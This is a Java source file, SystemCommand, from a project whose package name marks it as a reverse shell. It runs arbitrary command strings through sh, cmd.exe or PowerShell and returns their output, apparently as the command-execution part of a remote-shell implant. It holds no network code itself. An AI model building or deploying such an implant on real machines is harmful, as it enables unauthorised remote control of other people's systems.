package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.DataManipulationUtil;
import com.mtattab.reverseshell.util.SystemCommandUtil;
import jakarta.annotation.Nullable;
import lombok.Cleanup;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class SystemCommand implements Command {
    @Override
    public String executeCommand(String command) {
        String res =  runOsCommand( command, null);

        return res ;
    }

    public static String runOsCommand( String command, @Nullable File currentWorkingDir){
        StringBuilder output = new StringBuilder();
        File currentDir = SystemCommandUtil.currentWorkingDir;
        if (currentWorkingDir!=null) {
            currentDir = currentWorkingDir;
        }

        output.append("Running in: " + currentDir);
        output.append("\n");
        output.append("Command: " + command);
        output.append("\n");

        try {
            ProcessBuilder builder = new ProcessBuilder();
            builder.directory(currentDir);

            checkOSForCommand(builder,command);

            Process process = builder.start();

//            @Cleanup
//            OutputStream outputStream = process.getOutputStream();

            @Cleanup
            InputStream inputStream = process.getInputStream();

            @Cleanup
            InputStream errorStream = process.getErrorStream();

            output.append(printStream(inputStream));
            output.append("\n");

            output.append(printStream(errorStream));
            output.append("\n");

            boolean isFinished = process.waitFor(60, TimeUnit.SECONDS);



            if(!isFinished) {
                process.destroyForcibly();
            }

        }catch (Exception e){
            output.append("exception occured with command: "+e.getMessage());
            e.printStackTrace();
        }
        return output.toString();
    }
    private static void checkOSForCommand( ProcessBuilder builder, String command){
        List<String> commands = new ArrayList<>();

        if(SystemCommandUtil.isWindows) {
            setWindowPrompt(commands);
        }else {
            // Use a Unix shell to run the command on non-Windows systems
            commands.add("sh");
            commands.add("-c");

        }

        commands.addAll(DataManipulationUtil.stringToList(command, " "));
        builder.command(commands);
    }
    private static void setWindowPrompt(List<String> commands){
        if (SystemCommandUtil.runPowerShell){
            commands.add("powershell");
            commands.add("-Command");
        }else {
            commands.add("cmd.exe");
            commands.add("/c");
        }

    }
    private static String printStream(InputStream inputStream) throws IOException {
        StringBuilder output = new StringBuilder();
        try(BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
            String line;
            while((line = bufferedReader.readLine()) != null) {
                output.append(line);
                output.append("\n");

            }

        }
        return output.toString();
    }

}
